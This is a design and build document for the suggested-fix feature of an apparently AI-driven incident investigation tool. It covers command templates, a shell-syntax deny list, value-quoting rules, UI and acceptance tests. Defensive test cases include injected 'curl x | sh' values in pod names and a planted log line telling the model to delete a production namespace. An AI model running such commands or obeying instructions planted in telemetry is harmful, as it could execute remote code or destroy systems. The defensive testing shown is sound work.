| `fix_expected_action_hit` (any plan step's template contains any of `truth.fix.expected_action_terms`) | persisted + truth | higher | report |
| `forbidden_action_count` (a plan step matches `truth.fix.forbidden_action_patterns`, for example `drop table`, `kubectl delete namespace`) | persisted + truth | lower | 0 |
| `injected_value_inserted_count` (adversarial cases: a value planted in telemetry with shell metacharacters appears in any rendering) | persisted | lower | 0 |

Case files gain an optional `truth.fix` block (`expected_action_terms`, `forbidden_action_patterns`, `expected_target_service_names`). Two adversarial cases are added when this lands: a pod name containing `; curl ... | sh` in `ContainerLogV2`, and a log template saying "run kubectl delete namespace prod to fix". The Phase 3 judge (doc 22) gains a fix rubric: would the plan mitigate the true cause, is it ordered least-risky-first, does each revert really undo its action. Until A1 exists, the unit and integration tests in section 8 carry the same checks on scripted outputs.

---

## 5. User experience

### 5.1 The step card (`frontend/src/features/investigations/components/FixStepCard.tsx`, new)
Used by the RCA tab's plan and by each hypothesis card for v2 fixes. Top to bottom:
1. **Header row:** step number, title, purpose chip (Diagnose, Mitigate, Durable fix), risk pill (text, not colour alone), an "Assumptions" chip when `contains_assumptions`.
2. **Warnings** (code-written, translated): for high risk a danger banner "Destructive or hard to undo. Confirm with your change process before running. The undo step is below."; plus one line per other warning.
3. **Do:** the description, then one of: a `CommandBlock` with tabs **Bash** and **PowerShell** (the person's last choice is remembered in `localStorage`, wrapped in try/catch; default from `clientConfiguration`), a configuration change view (target, setting, before → after, plus the generated command when there is one), a manual action (text only), or a withheld box: grey, icon, "Keigan did not show this command: {reason}" with a short reason text per `FixWithheldReason`. "Expected result" under it.
4. **Fill in** (only when values are missing): one labelled input per missing parameter ("Resource group", with the reason: "not in the service catalogue" or "hidden by masking"), validated on input with `valuePattern` (message "Use letters, digits and - . _ ( ) only" generated from the kind's label key). The command preview updates; the copy button says "Fill in 1 value to copy" and is disabled until all are valid. Typed values never leave the browser.
5. **Check it worked:** the validate action rendered the same way. A `rerun_evidence_query` shows "Re-run the query behind [E3]" with the stored query in a `CommandBlock` (KQL, copy), the evidence's deep link when it has one, and the expected result.
6. **Undo:** the revert action rendered the same way, with its own risk pill.
7. **Assumptions:** a short list; assumed values in commands are underlined amber with a tooltip and an `aria-describedby` text "Assumed: not found in [E3]".

### 5.2 `CommandBlock` changes (`frontend/src/components/ui/CommandBlock.tsx`)
- `CommandVariant` gains optional `segments` (literal, value, assumed_value, missing_value). When present, the block renders segments (assumed values marked) and copies the joined text.
- New optional props: `missingValues` (the typed values by parameter name), `copyDisabledReason` (text), `confirmBeforeCopy` (for high risk: the copy button opens a small dialog "This command is destructive. Read the undo step first." with Copy and Cancel; focus moves into it and returns to the button).
- Joining for a typed value: bare if it matches `barePattern`, otherwise wrapped in single quotes; the pattern guarantees no quote inside. This function lives in `frontend/src/features/investigations/fixes/insertTypedValue.ts` with unit tests using the same vectors as the backend renderer tests (the vectors file is `backend/tests/support/fix_value_quoting_vectors.json`; the frontend test reads it by relative path, so the two cannot drift).

### 5.3 RCA tab "How to fix" card (`RcaSection.tsx`)
`fixPlan` present: the overview (MarkdownView, citations as chips like the other cards), then the plan's `FixStepCard`s, each with a small "from the {perspective} hypothesis" caption, and a "Copy plan as text" button that copies the code-rendered markdown (for a change ticket). `fixPlan` null: today's `MarkdownView` of `howToFixMarkdown` (v1 investigations). The card's description stays "Keigan suggests; you decide and run."

### 5.4 Hypotheses tab (`HypothesesSection.tsx`)
v2 fixes use `FixStepCard` (compact variant: validate and undo collapsed in a `<details>` per step). v1 fixes keep today's layout plus a caption "Written before step checks existed".

### 5.5 States
- Loading: the investigation page's existing skeleton. Running investigation: the card is not shown (as today).
- Empty: evidence-only or no fix: today's empty states.
- Partial: some steps withheld: they show the withheld box; the plan still renders. All values missing: commands show with fill-in fields.
- Error: the page's existing error state; no new request is made by this feature.

### 5.6 Keyboard and screen readers
Each step is an `<li>` in an `<ol>` with an accessible name "Step 2: Restart the function app, risk medium". Tabs follow the existing tablist pattern. Inputs have labels and `aria-invalid` plus a described-by message. Copy announces "Copied" through the existing live region of `CopyButton`. Risk and purpose are text. The confirm dialog is the existing `components/ui/ConfirmDialog.tsx` (focus trap, Escape closes). Highlighted values are not conveyed by colour only (underline plus described-by).

### 5.7 Phone layout (390 px)
Steps stack; the dialect tabs scroll sideways; inputs are full width; buttons are at least 44 px high; long commands wrap (CommandBlock's default `wrapLines`).

### 5.8 Locales (en, es, es-MX falls back to es, fr, ja, nl, zh-CN)
New key groups in `investigations`: `fixSteps.purpose.*`, `fixSteps.warning.*` (one per `FixWarning`), `fixSteps.withheld.*` (one per `FixWithheldReason`), `fixSteps.valueStatus.*`, `fixSteps.fillIn.*`, `fixSteps.sections.*` (Do, Check it worked, Undo, Assumptions, Expected result), `fixSteps.copyPlan`, `fixSteps.legacyCaption`. In `common`: `commandBlock.confirmCopy.*`, `commandBlock.copyDisabled`, `commandBlock.dialect.*`. Parameter kind labels in `investigations.fixSteps.parameterKind.*`. The locale check script must pass.

---

## 6. Safety, access and privacy

### 6.1 Who sees what
Unchanged: readers of the application see the investigation (`InvestigationService.load_readable_investigation`); emails with fix steps go only to `TECHNICAL_ROLES`; communications to non-technical audiences never get the fix (doc 06, 5.2 item 8). No new write path, so no new audit event. Nothing is executed.

### 6.2 Template shape rules (`fix_command_shape.py`)
Refused anywhere in the literal text of a template: newline or carriage return; `;`, `&`, `&&`, `||`; `>` and `<` (redirects, and the `<placeholder>` form); backtick; `$(`, `${`, `<(`, `>(`; in PowerShell also `@(`, `$` followed by a letter (variables), `iex`, `Invoke-Expression`, `&` as call operator, `--%`. A `|` is allowed once, and only when the right-hand program is in `read_only_executables` or a PowerShell read-only prefix (`Select-String`, `Where-Object`, `Select-Object`, `Measure-Object`, `Sort-Object`, `Format-*`). The first token must belong to the declared `tool` (kubectl family executables, `az`, `helm`, a Verb-Noun cmdlet for `powershell`, a known executable for `shell`, SQL mode for `sql`); an unknown executable under `shell` is allowed and rated at least medium (classifier rule).

### 6.3 Values from telemetry
Telemetry, tickets, knowledge, runbooks and notes are untrusted. Values from them are accepted only through typed slots, matched against the kind pattern (which excludes every shell-special character and a leading `-`), checked against their claimed source, and quoted by code. A refused value is never displayed (it may be the payload); the slot becomes a fill-in with the reason "the value seen in the data contained characters that are unsafe in a command; check it and type it".

### 6.4 Masking and secrets
Values that are masking placeholders become fill-ins (Keigan never keeps the real value, doc 06, section 6). Secret patterns in a template or value withhold the command; secret-like setting names withhold the configuration change; secret-printing commands are high risk with a warning. `fix_plan_markdown` output is passed through `sanitize_ai_markdown` before storage and again by the notification renderer (doc 06, 5.2 item 8). Resource names and ids are not personal data and are shown as today.

### 6.5 Retention
Part of the investigation; removed with it by `purge_expired_incidents` (`INCIDENT_RETENTION_DAYS`).

---

## 7. Acceptance criteria

| # | Criterion | Test type |
|---|---|---|
| AC-1 | A scripted v2 `HypothesisResult` with three steps is stored with `schema_version` 2, `step_id`s `application-1..3`, and every stored field matches section 4.2.5 | integration (graph) |
| AC-2 | `quote`/render: a bare-safe value is inserted bare in both dialects; `rg-claims (jp)` is inserted as `'rg-claims (jp)'` in both | unit |
| AC-3 | A value glued to literal text that needs quotes → withheld `value_not_insertable` | unit |
| AC-4 | An evidence value `claims-api; curl x | sh` for kind `kubernetes_name` → status `refused`, the value appears in no rendering, the slot is a fill-in | unit + integration |
| AC-5 | A value `--all-namespaces` for any kind → `refused` | unit |
| AC-6 | A template containing `<resource-group>` → withheld `unsafe_shell_syntax`; so does each item in 6.2 (one parametrised test per item) | unit |
| AC-7 | A pipe into `grep` is allowed; into `sh`, `bash`, `iex` → withheld | unit |
| AC-8 | `kubectl delete pod {{pod}}` with no revert → withheld `destructive_without_revert`, hypothesis `fix_risk_level` high | unit |
| AC-9 | The same with a manual-action revert → shown, risk high, warning banner key present | unit |
| AC-10 | A template with `Password=abc;` or a JWT → withheld `secret_in_command` | unit |
| AC-11 | `az keyvault secret show ...` and `kubectl get secret x -o yaml` → risk high, warning `prints_secrets` | unit (classifier) |
| AC-12 | A `service_catalogue` value not in the catalogue → `assumed`, `contains_assumptions` | unit |
| AC-13 | An `evidence` value cited to `E3` but absent from E3's stored text → `assumed` with reason; present → `verified`; an invalid code → `assumed` | unit |
| AC-14 | A value `<IP_1>` → `masked`, fill-in | unit |
| AC-15 | `app_setting` change on an App Service with verified before-value → set command from the catalogue, derived revert with the before-value, warning `restarts_service`, risk ≥ medium | unit |
| AC-16 | Setting name `Db__Password` → withheld `secret_setting_name` | unit |
| AC-17 | Synthesis references: valid ones are kept in order; an unknown perspective or step number is dropped; none valid or synthesis failed → the leading hypothesis's steps | unit (`fix_plan.py`) |
| AC-18 | `how_to_fix_markdown` is code-rendered: contains each plan step's default-dialect command in a fenced block, the high-risk warning line, "Open Keigan to fill in" for missing values, and no command that is withheld | unit |
| AC-19 | `markdown_to_safe_html` renders a fenced block as one escaped `<pre><code>` and no stray backtick | unit |
| AC-20 | UI: copy is disabled until every missing value is valid; an invalid typed value shows the message and keeps copy disabled; the copied text equals the expected joined command | frontend unit (vitest) + browser check |
| AC-21 | UI: copying a high-risk command opens the confirm dialog; Cancel copies nothing | frontend unit |
| AC-22 | Every new key exists in the six locales (locale check script) | script |
| AC-23 | At 390 px the plan has no horizontal page scroll and every button is ≥ 44 px | browser check |
| AC-24 | Teams fallback answer and the technical-role email both contain the code-rendered steps; a business-role email contains none | integration (notification, teams) |
| AC-25 | The five settings are in `settings.py` with ranges, `.env.example` and Helm, defaults equal | unit (config) |
| AC-26 | The mock oracle's fixes for all eight simulator scenarios validate with no `unsafe_shell_syntax`, no `refused` and no `<...>` placeholder | integration |
| AC-27 | The hypothesis and synthesis prompts render with the new trusted variables | unit (`test_prompt_library.py`) |
| AC-28 | No route in the application has a path or name containing `execute`, `run-command` or `apply-fix` (guard against execution creeping in) | unit (route list) |
| AC-29 | A v1 row (no `schema_version`) is returned with `schemaVersion: 1` and today's fields; the page renders it with the legacy caption | integration (DTO) + browser |
| AC-30 | The validator's risk is never lower than the model's or the classifier's (property test over the catalogue examples) | unit |

---

## 8. Test plan (files mirror the source tree)

### 8.1 Backend
- `backend/tests/unit/ai/test_fix_parameter_kinds.py` — patterns, leading `-`, masked placeholders, quoting; reads `backend/tests/support/fix_value_quoting_vectors.json`.
- `backend/tests/unit/ai/test_fix_command_shape.py` — every rule in 6.2, both dialects.
- `backend/tests/unit/ai/test_fix_command_renderer.py` — segments, whole-word rule, both dialects.
- `backend/tests/unit/ai/test_fix_step_validator.py` — AC-4 to AC-16, AC-30.
- `backend/tests/unit/ai/test_fix_plan.py` — AC-17.
- `backend/tests/unit/ai/test_fix_plan_markdown.py` — AC-18.
- `backend/tests/unit/ai/test_command_risk_classifier.py` — extended for `secret_revealing_commands` (AC-11).
- `backend/tests/unit/ai/test_investigation_ai_schemas.py` (new) — the kinds `Literal` equals the catalogue keys.
- `backend/tests/unit/ai/test_investigation_graph.py` — AC-1, AC-8 through the graph with a scripted gateway.
- `backend/tests/integration/ai/test_investigation_mock_fixes.py` — AC-26.
- `backend/tests/unit/services/test_notification_renderer.py` — AC-19.
- `backend/tests/integration/services/test_notification_service.py`, `test_teams_chat_service.py` — AC-24.
- `backend/tests/integration/controllers/test_investigation_controller.py` (new) — v1 and v2 shapes (AC-29).
- `backend/tests/integration/migrations/test_investigation_fix_plan_migration.py` — upgrade and downgrade.
- `backend/tests/unit/config/test_suggested_fix_settings.py` — AC-25.
- `backend/tests/integration/controllers/test_no_execution_routes.py` — AC-28 (walks `app.routes`).
- `backend/tests/unit/test_frontend_contract.py` — extended: the TypeScript `FixStep` type in `investigationsApi.ts` has the DTO's fields (the repository already checks backend and frontend shapes this way).

### 8.2 Frontend
- `frontend/src/features/investigations/fixes/insertTypedValue.test.ts` (same vectors file), `FixStepCard.test.tsx` (AC-20, AC-21), `CommandBlock.test.tsx` (segments, confirm).
- Locale check, contrast check (amber underline and the withheld box on light and dark), typecheck, build.

### 8.3 Browser check
Extend `frontend/scripts/capture-screens.mjs` (or a new `check-suggested-fixes.mjs` in the style of `check-ask-keigan.mjs`): seeded demo, open an investigation, RCA tab, fill a missing value, copy, open the high-risk confirm, switch to PowerShell, at 1440 and 390 px, light and dark.

### 8.4 Manual
Paste three rendered commands (one with a quoted value) into bash and PowerShell 7 with `--help` or `-WhatIf`-style dry options to confirm they parse; send one simulated Teams message with a fenced block to the desktop and mobile clients.

---

## 9. Phased build plan

| Phase | Tasks | Size | Depends on | Demonstrable at the end |
|---|---|---|---|---|
| 1. Core checks | Enums; `fix_parameter_kinds.yaml` and module; `fix_command_shape.py`; `fix_command_renderer.py`; `secret_revealing_commands` in the classifier; vectors file; unit tests | M | — | The unit tests: a hostile value cannot enter a command |
| 2. Pipeline | New output schemas; `fix_step_validator.py`; `fix_plan.py`; `fix_plan_markdown.py`; hypothesis prompts v4, synthesis v4; graph changes; Alembic revision and Azure SQL scripts; DTOs v1 and v2; mock oracle v2; settings in three places; demo SQL regenerated | M | 1 | `GET /investigations/{id}` returns v2 steps and a plan for every seeded scenario |
| 3. Screens | `CommandBlock` segments, fill-in, confirm; `FixStepCard`; RCA and hypotheses tabs; locales ×6; browser check | M | 2 | The RCA tab shows copyable, checkable steps in both dialects, phone and desktop |
| 4. Channels | Fenced code in `markdown_to_safe_html`; Teams and email tests; manual Teams client check | S | 2 | A technical-role email shows commands as code; a business email shows none |
| 5. Scoring | Section 4.8 metrics and the two adversarial cases | S | A1 (doc 22) built | Fix-quality numbers in the harness report |

Overall M (doc 21 estimated S to M; the safety rules in section 6 are what make it M).

---

## 10. Docs, migration and demo-data impact
- `ai-engine/06_AI_ENGINE_AND_PROMPT_SAFETY.md`: section 3.4 (the fix schema), 3.5 (synthesis picks steps; `how_to_fix_markdown` is code-rendered), 5.2 item 8 (template slots, shape rules, secret-printing rule, withholding), the prompt table versions.
- `architecture/03_DATABASE_DESIGN.md` and the ER diagram (`15_...`, regenerated): `investigation.fix_plan_json`.
- `architecture/05_API_CONTRACT.md`: the investigation detail shape (`proposedFix.schemaVersion`, `fixPlan`).
- `ui-ux/04_UI_UX_DESIGN_SYSTEM.md`: `CommandBlock` segments, fill-in and confirm; the step card.
- `features/ai-evaluation-harness/22_...`: section 9 "deliberately left out" loses fix quality; the metric family of 4.8 is added.
- `product/12_FEATURE_TRACKER.md`, `00_STATUS_AND_ROADMAP.md`: by the lead.
- Azure SQL: scripts 01 to 06 regenerated, `migrations/<id>_investigation_fix_plan.sql`, `demo_data/05_incidents_and_investigations.sql` regenerated (the seeded investigations come from the mock oracle, so they show v2 steps, one missing resource group, one assumed value and one high-risk step with its undo).
- `backend/.env.example`, Helm `values.yaml`: the five settings.

---

## 11. Risks and mitigations; open questions for the owner

| Risk | Mitigation |
|---|---|
| The deeper schema makes some models fail structured output more often | One repair retry exists; the harness measures failure rate per model; if needed the step schema can be flattened (`action_*` fields) without changing what is stored |
| Too much is withheld and the feature looks empty | Withheld steps keep their description; `withheld_command_count` by reason shows which rule fires; patterns live in a catalogue and can be widened with a review |
| Patterns too narrow for real names (for example Unicode resource group names) | They become fill-ins, not failures; widen the catalogue entry after a security review |
| Two implementations of typed-value joining (Python, TypeScript) drift | One vectors file read by both test suites |
| Ask Keigan answers can still contain free-text commands | Out of scope here; they are marked unverified when uncited (doc 23); a later step could pass answer code blocks through the classifier |
| People read "verified" as "safe" | The label is "found in [E3]", never "safe"; risk is separate and always shown |

**Open questions for the owner**
1. **Q1. Default shell:** bash or PowerShell for MetLife responders? (Default `bash`; one setting.)
2. **Q2. Copy tracking:** should Keigan record that a step was copied (an audit row), to measure use? Not in this design.
3. **Q3. "This fix worked" feedback** per step, separate from the investigation verdict? It would feed similar-incident memory (doc 34). Not in this design.
4. **Q4. Data-changing SQL** stays a manual action only (F6). Confirm with the data owners.
5. **Q5.** A security reviewer should read `fix_parameter_kinds.yaml` and the rules in 6.2 before release.


---

## 12. Build notes (2026-11-23): part 1

Built on `keigan-ui-ux` by the lead, deliberately **part of the design**: phase 1 (core checks), the fenced-code part of phase 4, and a bridge that applies the checks to the commands a hypothesis proposes today. No schema change.

Built:
- `resources/catalogs/fix_parameter_kinds.yaml` and `ai/fix_parameter_kinds.py` (twelve kinds; patterns are matched with `fullmatch`, because a pattern's `$` also matches before a trailing newline, which the first test run found); `ai/fix_command_shape.py` (the rules of 6.2, SQL handled separately); `ai/fix_command_renderer.py` (segments, quoting by code, the whole-word rule, missing values); `secret_revealing_command_patterns` in `command_risk_rules.yaml` with `reveals_secrets`; `tests/support/fix_value_quoting_vectors.json` (read by the backend tests; the frontend test that should read it is not written).
- `ai/fix_command_check.py` applies shape, length, secret and data-changing-SQL checks; `InvestigationGraphRunner._validated_hypothesis` withholds a failing command (`command_text` null, `command_withheld_reason`, `command_warnings` in the stored JSON and in `FixStepDto`), still counts its risk, and `_flag_high_risk_commands` applies the same checks to the synthesis's fenced blocks.
- Prompts: hypothesis and synthesis **version 5** no longer ask for `<placeholder>` values; the offline model leaves the command out when the resource group is unknown.
- `markdown_to_safe_html` renders fenced code blocks (AC-19). Setting `SUGGESTED_FIX_MAXIMUM_COMMAND_CHARACTERS`.
- The hypothesis card shows the withheld reason and the secret warning (six locales).

Not built (the design's phases 2, 3 and 5, and the channel tests): the new output schema with typed parameters, `fix_step_validator.py` (source checks: verified and assumed values), `fix_plan.py` and `fix_plan_markdown.py`, `investigation.fix_plan_json` and its revision, validate and revert steps with their own risk, `FixStepCard`, `CommandBlock` segments and fill-in fields, the confirm dialog for high risk, dialect tabs, the section 4.8 metrics, AC-24 and AC-28 tests. Because slots do not exist yet, a command with an unknown value is withheld instead of offered with a fill-in field.
Found while building: the spec's example resource group `rg-claims (jp)` contains a space, which Azure does not allow; the vectors use `rg-claims(jp)`.
